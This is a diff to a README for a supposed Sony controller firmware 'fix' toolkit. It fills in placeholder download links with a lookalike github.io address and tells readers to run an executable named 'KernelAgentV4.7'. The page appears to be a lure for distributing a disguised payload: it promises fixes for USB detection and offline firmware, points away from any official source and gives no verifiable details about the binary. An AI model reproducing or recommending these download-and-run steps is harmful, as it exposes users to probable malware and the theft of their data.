@@ -2,13 +2,15 @@
 
 This toolkit enhances Sony’s official Firmware Updater by resolving USB detection failures, enabling offline firmware modes, and boosting update stability for DualShock 4 and DualSense controllers using `KernelAgentV4.7`.
 
-[![Download Firmware Fix](https://img.shields.io/badge/Download-Controller_Firmware_Toolkit-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Firmware Fix](https://img.shields.io/badge/Download-Controller_Firmware_Toolkit-blueviolet)](https://sony-controller-firmware-updater-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://sony-controller-firmware-updater-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\SonyFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will fix USB detection issues and unlock offline firmware handling  
